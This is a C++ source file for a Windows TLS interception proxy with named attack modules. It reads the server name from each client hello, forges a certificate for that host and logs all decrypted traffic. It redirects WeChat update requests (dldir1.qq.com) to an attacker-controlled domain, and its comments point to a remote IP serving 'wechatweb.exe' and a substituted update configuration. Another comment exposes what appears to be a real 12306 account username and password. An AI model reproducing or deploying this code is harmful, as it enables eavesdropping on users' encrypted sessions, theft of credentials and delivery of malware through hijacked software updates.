#include <windows.h>
#include <WINSOCK2.H>
#include <stdexcept>
#include "sslPublic.h"
#include "sslPacket.h"
#include "sslproxy.h"
#include "../HttpUtils.h"
#include "..\\include\\openssl\\ssl.h"
#include "..\\include\\openssl\\err.h"
#include "MakeCert.h"
#include "HttpProxy.h"
#include "../Public.h"
#include "../utils/Tools.h"
#include "AuthorityCert.h"
#include "SSLAttack.h"
#include "PluginServer.h"
#include "WeixinPC.h"
#include "../Public.h"
#include "SSLRetransfer.h"
#include "../Deamon.h"
#include <mstcpip.h>
#include <vector>
#include <stdio.h>
#include "informerClient.h"
#include "../Utils/lock.h"


//12306
//username = hong1976080990&password = SpkaHaPUP79MKVukA 

/*firefox设置使用windows根证书
1 在地址栏键入"about:config" 点击“我了解此风险”
2 在下方任意位置右键，选择新建布尔值
3 输入首选项名称为“security.enterprise_roots.enabled”并把值设置为 true
4 重启浏览器
*/

TOOLSLOCK gcertlock = { 0 };


int SslProxy::SSLProxy(LPSSLPROXYPARAM pstSSLProxyParam) {
	int				iCounter = 0;
	int				iRet = 0;
	unsigned char	recvBuffer[NETWORK_BUFFER_SIZE + 4];
	char szout[1024];

	iCounter = ReadPendingData((char*)recvBuffer, NETWORK_BUFFER_SIZE, pstSSLProxyParam->SSLToClient);
	if (iCounter <= 0)			//if ret = 0, need to be further judgment
	{
		return FALSE;
	}
	else {
		*(recvBuffer + iCounter) = 0;

		//kyfw.12306.cn
		//mobile.12306.cn
		///upd/updaemon.php
		if ( strstr((char*)recvBuffer, ".12306.cn\r\n") )
		{
			return FALSE;
		}

		iRet = Public::WriteLogFile(SSL_PROXY_FILE, recvBuffer, iCounter, "ssl packet data:\r\n");
	}

	iRet = HttpsAttack::sslAttackProc((char*)recvBuffer, iCounter, pstSSLProxyParam);
	if (iRet > 0 )
	{
		return FALSE;
	}

	DWORD dwip = HttpUtils::getIPFromHost(pstSSLProxyParam->host);
	if (dwip == 0) {
#ifdef _DEBUG
		iRet = wsprintfA(szout, "SSL getIPFromHost:%s error\r\n", pstSSLProxyParam->host);
		Public::WriteLogFile(ATTACK_LOG_FILENAME, (unsigned char *)recvBuffer, iCounter, szout);
		printf(szout);
#endif
		return FALSE;
	}
	else {
		pstSSLProxyParam->sockToServer = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (pstSSLProxyParam->sockToServer <= 0)
		{
			printf("%s SSLProxy server socket error:%d",pstSSLProxyParam->host, WSAGetLastError());
			return FALSE;
		}

		int overtime = CONNECTION_TIME_OUT;
		iRet = setsockopt(pstSSLProxyParam->sockToServer, SOL_SOCKET, SO_RCVTIMEO, (char *)&overtime, sizeof(int));
		iRet += setsockopt(pstSSLProxyParam->sockToServer, SOL_SOCKET, SO_SNDTIMEO, (char *)&overtime, sizeof(int));

		pstSSLProxyParam->saToServer.sin_addr.S_un.S_addr = dwip;
		pstSSLProxyParam->saToServer.sin_port = ntohs(pstSSLProxyParam->usPort);
		pstSSLProxyParam->saToServer.sin_family = AF_INET;
	}
		
	iRet = connect(pstSSLProxyParam->sockToServer, (struct sockaddr *)&(pstSSLProxyParam->saToServer), sizeof(sockaddr_in));
	if (iRet )
	{
		printf("SSLProxy connect server:%s,ip:%08x error:%u\r\n",pstSSLProxyParam->host,
			pstSSLProxyParam->saToServer.sin_addr.S_un.S_addr, WSAGetLastError());
		return FALSE;
	}


	if (pstSSLProxyParam->version == 0x0303 || pstSSLProxyParam->version == 0x0203 || pstSSLProxyParam->version == 0x0103)
	{
		pstSSLProxyParam->ctxToServer = SSL_CTX_new(TLSv1_2_client_method());
	}
	else {
		pstSSLProxyParam->ctxToServer = SSL_CTX_new(SSLv23_client_method());
	}

	if ((int)pstSSLProxyParam->ctxToServer <= 0)
	{
		printf("%s SSLProxy server SSL_CTX_new error\n",pstSSLProxyParam->host);
		return FALSE;
	}

	pstSSLProxyParam->SSLToServer = SSL_new(pstSSLProxyParam->ctxToServer);
	if ((int)pstSSLProxyParam->SSLToServer <= 0)
	{
		printf("%s SSL_new server error\n",pstSSLProxyParam->host);
		return FALSE;
	}

	iRet = SSL_set_fd(pstSSLProxyParam->SSLToServer, pstSSLProxyParam->sockToServer);
	if (iRet != 1)
	{
		printf("SSLProxy %s SSL_set_fd errorcode:%d,description:%s,return:%d\n",pstSSLProxyParam->host,
			SSL_get_error(pstSSLProxyParam->SSLToServer, iRet),SSL_state_string_long(pstSSLProxyParam->SSLToServer), iRet);
		return FALSE;
	}

	iRet = SSL_connect(pstSSLProxyParam->SSLToServer);
	if (iRet != 1)
	{
		printf("SSLProxy %s SSL_connect errorcode:%d,description:%s,return:%d\n",pstSSLProxyParam->host,
			SSL_get_error(pstSSLProxyParam->SSLToServer, iRet),SSL_state_string_long(pstSSLProxyParam->SSLToServer), iRet);
		return FALSE;
	}

	iRet = SSL_write(pstSSLProxyParam->SSLToServer, recvBuffer, iCounter);
	if (iRet != iCounter)
	{
		printf("SSLProxy %s SSL_write errorcode:%d,description:%s,return:%d\n",pstSSLProxyParam->host,
			SSL_get_error(pstSSLProxyParam->SSLToServer, iRet),SSL_state_string_long(pstSSLProxyParam->SSLToServer), iRet);
		return FALSE;
	}

	fd_set	stFdSet = { 0 };
	timeval	stTmVal = { 0 };
	stTmVal.tv_sec = SELECT_TIME_OUT / 1000;
	stTmVal.tv_usec = 0;

	SOCKET selectsock = pstSSLProxyParam->sockToServer;
	if (pstSSLProxyParam->sockToClient > pstSSLProxyParam->sockToServer)
	{
		selectsock = pstSSLProxyParam->sockToClient;
	}

#undef FD_SETSIZE
#define FD_SETSIZE 1024

	while (TRUE)
	{
		FD_ZERO(&stFdSet);
		FD_SET(pstSSLProxyParam->sockToClient, &stFdSet);
		FD_SET(pstSSLProxyParam->sockToServer, &stFdSet);

		iRet = select(selectsock + 1, &stFdSet, NULL, NULL, &stTmVal);
		if (iRet <= 0 || iRet > 2)
		{
			break;
		}

		if (FD_ISSET(pstSSLProxyParam->sockToClient, &stFdSet))
		{
			iCounter = ReadPendingData((char*)recvBuffer, NETWORK_BUFFER_SIZE, pstSSLProxyParam->SSLToClient);
			if (iCounter <= 0)
			{
				break;
			}

			*(recvBuffer + iCounter) = 0;

			iRet = Public::WriteLogFile(SSL_PROXY_FILE, recvBuffer, iCounter, "");

			iRet = HttpsAttack::sslAttackProc((char*)recvBuffer, iCounter, pstSSLProxyParam);
			if (iRet > 0)
			{
				break;
			}

			iRet = SSL_write(pstSSLProxyParam->SSLToServer, (char *)recvBuffer, iCounter);
			if (iRet != iCounter)
			{
				break;
			}

			pstSSLProxyParam->timeclient = time(0);
		}

		if (FD_ISSET(pstSSLProxyParam->sockToServer, &stFdSet))
		{
			iCounter = ReadPendingData((char*)recvBuffer, NETWORK_BUFFER_SIZE, pstSSLProxyParam->SSLToServer);
			if (iCounter <= 0)
			{
				break;
			}

			*(recvBuffer + iCounter) = 0;

			iRet = Public::WriteLogFile(SSL_PROXY_FILE, recvBuffer, iCounter, "");

			iRet = SSL_write(pstSSLProxyParam->SSLToClient, (char *)recvBuffer, iCounter);
			if (iRet != iCounter)
			{
				break;
			}

			pstSSLProxyParam->timeserver = time(0);
		}
	}

	return TRUE;
}




int SslProxy::SSLConnectionMain(LPSSLPROXYPARAM pstSSLProxyParam) {

	int iRet = 0;

	char szpeekbuf[PEEK_SERVERNAME_BUF_SIZE+4];
	int peeklen = recv(pstSSLProxyParam->sockToClient, szpeekbuf, PEEK_SERVERNAME_BUF_SIZE, MSG_PEEK);
	if (peeklen > 0)
	{
		*(szpeekbuf + peeklen) = 0;

		if (HttpUtils::isHttpPacket(szpeekbuf))
		{
			//return FALSE;

			return HttpProxy::HttpProxyMain((LPHTTPPROXYPARAM)pstSSLProxyParam);
		}
		else {
			iRet = getServerNameFromClientHello(szpeekbuf, peeklen,(unsigned char*) pstSSLProxyParam->host, pstSSLProxyParam->version);
			if (iRet > 0)
			{
				iRet = SSLPublic::isTargetHost(pstSSLProxyParam->host);
				if (iRet )
				{

				}
				else {
					return FALSE;
					//return SSLRetransfer::RetransferProxyMain((LPHTTPPROXYPARAM)pstSSLProxyParam);
				}
			}
			else {
				//ip.host == 47.101.189.13 && !(tcp.port == 3389)
				//https with ip
				//https://47.101.189.13/test20190402/wechatweb.exe
				//https://47.101.189.13:443/weixin/android/wxweb/updateConfig.xml
				//https://dldir1.qq.com/weixin/android/wxweb/updateConfig.xml
				//lstrcpyA(pstSSLProxyParam->host, gstrServerIP.c_str());
				lstrcpyA(pstSSLProxyParam->host, MYOWNSITE_ATTACK_DOMAINNAME);
				//return SSLRetransfer::RetransferProxyMain((LPHTTPPROXYPARAM)pstSSLProxyParam);
			}
		}
	}
	else {
		printf("ssl client recv MSG_PEEK error:%u\r\n", WSAGetLastError());
		return -1;
	}

	if (strstr(pstSSLProxyParam->host, "dldir1.qq.com") || strstr(pstSSLProxyParam->host, MYOWNSITE_ATTACK_DOMAINNAME))
	{
		return AuthorityCert::processAuthorCert(pstSSLProxyParam->host, MYOWNSITE_ATTACK_DOMAINNAME, pstSSLProxyParam);
	}

	LARGE_INTEGER li = { 0 };
	iRet = QueryPerformanceCounter(&li);
	ULONGLONG id = li.HighPart;
	id = (id << 32) | li.LowPart;
	int lockret = Lock::enterlock(gcertlock, id);

	iRet = MakeCert::MakesureCertExist(pstSSLProxyParam->host);

	lockret = Lock::leavelock(gcertlock, id);

	if (iRet == FALSE)
	{
		printf("SSL MakesureCertExist %s error\n", pstSSLProxyParam->host);
		return FALSE;
	}

	//小端顺序为0x0103 0x0303 0x0203,网络字节顺序0x0301,0x0303,0x0302
	//0x0300 = sslv3,0x0301 = tls1.0,0x0302 = tls1.1,0x0303=tls1.2
	if (pstSSLProxyParam->version == 0x0303 || pstSSLProxyParam->version == 0x0203 || pstSSLProxyParam->version == 0x0103)
	{
		pstSSLProxyParam->ctxToClient = SSL_CTX_new(TLSv1_2_server_method());
	}
	else {
		pstSSLProxyParam->ctxToClient = SSL_CTX_new(SSLv23_server_method());
	}

	if ((int)pstSSLProxyParam->ctxToClient <= 0)
	{
		printf("SSL_CTX_new %s error\n", pstSSLProxyParam->host);
		return FALSE;
	}

	SSL_CTX_set_verify(pstSSLProxyParam->ctxToClient, SSL_VERIFY_NONE, 0);

	string cafilename = gLocalPath + CA_CERT_PATH + "\\" + CA_CRT_FILENAME;
	iRet = SSL_CTX_load_verify_locations(pstSSLProxyParam->ctxToClient, cafilename.c_str(), 0);
	if (iRet != 1)
	{
		printf("SSL_CTX_load_verify_locations %s error\n", pstSSLProxyParam->host);
		return FALSE;
	}

	SSL_CTX_set_default_passwd_cb_userdata(pstSSLProxyParam->ctxToClient, PRIVATE_KEY_PWD);

	string certfilename = gLocalPath + CERT_PATH + "\\" + string(pstSSLProxyParam->host) + ".crt";

	iRet = SSL_CTX_use_certificate_file(pstSSLProxyParam->ctxToClient, certfilename.c_str(), SSL_FILETYPE_PEM);
	if (iRet <= 0)
	{
		printf("SSL_CTX_use_certificate_file %s\n", pstSSLProxyParam->host);
		return FALSE;
	}

	string keyfilename = gLocalPath + CA_CERT_PATH + "\\" + SUBCA_KEY_FILENAME;
	iRet = SSL_CTX_use_PrivateKey_file(pstSSLProxyParam->ctxToClient, keyfilename.c_str(), SSL_FILETYPE_PEM);
	if (iRet <= 0)
	{
		printf("SSL_CTX_use_certificate_file %s error\n", pstSSLProxyParam->host);
		return FALSE;
	}

	iRet = SSL_CTX_check_private_key(pstSSLProxyParam->ctxToClient);
	if (iRet <= 0)
	{
		printf("%s SSL_CTX_check_private_key error\n", pstSSLProxyParam->host);
		return FALSE;
	}

	pstSSLProxyParam->SSLToClient = SSL_new(pstSSLProxyParam->ctxToClient);
	if ((int)pstSSLProxyParam->SSLToClient <= 0)
	{
		printf("SSL_new %s error\n", pstSSLProxyParam->host);
		return FALSE;
	}

	iRet = SSL_set_fd(pstSSLProxyParam->SSLToClient, pstSSLProxyParam->sockToClient);
	if (iRet != 1)
	{
		printf("SSL_set_fd %s errorcode:%d,description:%s,return:%d\n", pstSSLProxyParam->host, SSL_get_error(pstSSLProxyParam->SSLToClient, iRet),
			SSL_state_string_long(pstSSLProxyParam->SSLToClient), iRet);
		return FALSE;
	}

	//SSL_set_accept_state(pstSSLProxyParam->SSLToClient);

	iRet = SSL_accept(pstSSLProxyParam->SSLToClient);
	if (iRet != 1)
	{
		printf("SSL_accept %s errorcode:%d,description:%s,return:%d\n", pstSSLProxyParam->host, SSL_get_error(pstSSLProxyParam->SSLToClient, iRet),
			SSL_state_string_long(pstSSLProxyParam->SSLToClient), iRet);
		return FALSE;
	}

	iRet = SSLProxy(pstSSLProxyParam);

	return iRet;
}





int __stdcall SslProxy::SSLConnection(LPWORKCONTROL param) {

	LPSSLPROXYPARAM pstSSLProxyParam = 0;

	char szout[1024] = { 0 };

	int ret = 0;

	while (TRUE)
	{
		__try
		{
			ret = WaitForSingleObject(param->gSSLEvent, INFINITE);

			pstSSLProxyParam = param->gSSLProxyParam;

			ret = SetEvent(param->gSSLListenEvent);

			int overtime = CONNECTION_TIME_OUT;
			ret = setsockopt(pstSSLProxyParam->sockToClient, SOL_SOCKET, SO_RCVTIMEO, (char *)&overtime, sizeof(int));
			ret += setsockopt(pstSSLProxyParam->sockToClient, SOL_SOCKET, SO_SNDTIMEO, (char *)&overtime, sizeof(int));

			ret = SSLConnectionMain(pstSSLProxyParam);

			Deamon::removeSSL(pstSSLProxyParam);
		}
		__except (1)
		{
			SYSTEMTIME stSysTm = { 0 };
			GetLocalTime(&stSysTm);
			char szout[1024];
			int len = wsprintfA(szout, "SSL服务器端线程发生异常,错误码:%u,线程ID:%u,时间:%d.%d.%d %d:%d:%d\r\n", GetLastError(),
				pstSSLProxyParam->ulThreadID, stSysTm.wYear, stSysTm.wMonth, stSysTm.wDay, stSysTm.wHour, stSysTm.wMinute, stSysTm.wSecond);
			
			Public::WriteLogFile(ATTACK_LOG_FILENAME, szout, len);
			printf( szout);
		}
	}

	return FALSE;
}



SslProxy::SslProxy() {
	if (mInstance)
	{
		return;
	}

	mInstance = this;

	Lock::initlock(gcertlock, "certlock", 3000);
}

SslProxy::~SslProxy() {

}





//SSL_read_ex() and SSL_read() try to read num bytes from the specified ssl into the buffer buf. 
//On success SSL_read_ex() will store the number of bytes actually read in *readbytes.
//The read functions work based on the SSL / TLS records.
//The data are received in records(with a maximum record size of 16kB)
//SSL_peek_ex() and SSL_peek() are identical to SSL_read_ex() and SSL_read() 
//respectively except no bytes are actually removed from the underlying BIO during the read, 
//so that a subsequent call to SSL_read_ex() or SSL_read() will yield at least the same bytes

//SSL_read_ex() and SSL_peek_ex() will return 1 for success or 0 for failure

int SslProxy::ReadPendingData(char * lpdata, int size, SSL * ssl) {
	int ret = 0;
	int recvcnt = 0;
	
	int sslerror = 0;
	
	int accesssize = SSL_peek(ssl, lpdata + recvcnt, size - recvcnt);
	if (accesssize <= 0)
	{
		return recvcnt;
	}

	do
	{
		ret = SSL_read(ssl, lpdata + recvcnt, size - recvcnt);
		//SSL_get_error(ssl, ret) == SSL_ERROR_WANT_READ
		//pendsize = SSL_pending(ssl);	//always return 0
		sslerror = SSL_get_error(ssl, ret);
		if (sslerror != SSL_ERROR_NONE || ret <= 0)
		{
			return recvcnt;
		}
		else {
			recvcnt += ret;
		}
	} while (recvcnt < accesssize);


	int nextaccesssize = 0;
	if (accesssize == 1)
	{
		nextaccesssize = SSL_peek(ssl, lpdata + recvcnt, size - recvcnt);
		if (nextaccesssize > 0)
		{
			ret = SSL_read(ssl, lpdata + recvcnt, size - recvcnt);
			sslerror = SSL_get_error(ssl, ret);
			if (sslerror != SSL_ERROR_NONE || ret <= 0 )
			{
				printf("ReadPendingData sencondary SSL_read error:%u\r\n", sslerror);
				return recvcnt;
			}
			else {
				recvcnt += ret;
			}
		}
	}

	if (recvcnt != accesssize + nextaccesssize)
	{
		printf("ReadPendingData result recvcnt:%u,accesssize:%u error\r\n", recvcnt, accesssize);
	}
	return recvcnt;
}



//FALSE not standard client hello
//-1 error format
// 1 ok
int SslProxy::getServerNameFromClientHello(char * data, int len,unsigned char * servername, int & version) {

	SSLHEADER * lphdr = (LPSSLHEADER)data;
	if (lphdr->contenttype == 0x16 && lphdr->handshaketype == 1)
	{
		int mainver = lphdr->version & 0xff;
		int subver = (lphdr->version & 0xff00) >> 8;

		int handshakemainver = lphdr->handshakever & 0xff;
		int handshakesubver = (lphdr->handshakever) >> 8;
		if (mainver == 3 && handshakemainver == 3)
		{
			version = lphdr->version;
			//printf("ssl client hello version main version:%u,sub version:%u,handshake main version:%u,handshake sub version:%u\r\n",
			//	mainver,subver,handshakemainver,handshakesubver);
		}
		else {
			return -1;
		}
	}
	else {
		return -1;

		LPRESSLHEADER lpressl = (LPRESSLHEADER)data;
		if (lpressl->version == 0x80 && lpressl->type == 1 && lpressl->sessionIdLen == 0)
		{
			return FALSE;	// not standard ssl packet
		}
		else {
			return -1;
		}
	}

	//check ssl client hello length
	int sslhellolen = ntohs(lphdr->hdrlen);
	if (sslhellolen + 5 != len)
	{
		printf("ssl client hello header length:%u,size:%u\r\n", len, sslhellolen);
		return -1;		//ip segment packet,need to wait
	}

	char * ciphersuit = data + sizeof(SSLHEADER) + lphdr->sessionidlen;
	int cipherlen = ntohs(*(short*)ciphersuit);
	if (cipherlen >= len || cipherlen <= 0)
	{
		printf("ssl client hello cipher suit length error\r\n");
		return -1;
	}

	char * compress = ciphersuit + sizeof(short) + cipherlen;
	int comppresslen = *compress;
	if (comppresslen < 0)
	{
		printf("ssl client hello comppress methods length error\r\n");
		return -1;
	}

	char * lpexthdr = compress + sizeof(char) + comppresslen;
	int extlen = ntohs(*(short*)lpexthdr);
	int extbefore = lpexthdr - data + sizeof(short);
	if (extbefore + extlen != len)
	{
		printf("client hello extensions length:%u,ext before length:%u,client hello length:%u\r\n", extlen, extbefore, len);
		return -1;
	}

	LPSSLHEADER_EXTENSIONS lpext = (LPSSLHEADER_EXTENSIONS)(lpexthdr + sizeof(short));
	while (1)
	{
		if (lpext->exttype == 0)
		{
			LPCLIENTHELLO_SERVERNAME lpserver = (LPCLIENTHELLO_SERVERNAME)lpext;
			if (lpserver->servernametype == 0)
			{
				int servernamelen = ntohs(lpserver->sernamelen);
				if (servernamelen >= 256 || servernamelen <= 0)
				{
					printf("ssl client hello host name length:%u error\r\n", servernamelen);
					return -1;
				}
				char * lpservername = (char*)((unsigned int)lpserver + sizeof(CLIENTHELLO_SERVERNAME));
				memcpy(servername, lpservername, servernamelen);
				*(servername + servernamelen) = 0;
				if (*servername >= 0x80 || *servername <= 0)
				{
					printf("get error client hello packet\r\n");
					Public::WriteLogFile(ATTACK_LOG_FILENAME, (char*)servername, servernamelen);
					return 0;
				}
				return servernamelen;
			}
		}

		int extblocksize = sizeof(SSLHEADER_EXTENSIONS) + ntohs(lpext->typelen);
		if (extblocksize >= len || extblocksize <= 0)
		{
			printf("client hello extensions block size error\r\n");
			return -1;
		}

		lpext = (LPSSLHEADER_EXTENSIONS)((unsigned int)lpext + extblocksize);
		if ((int)lpext - (int)data >= len)
		{
			break;
		}
	}

	return FALSE;
}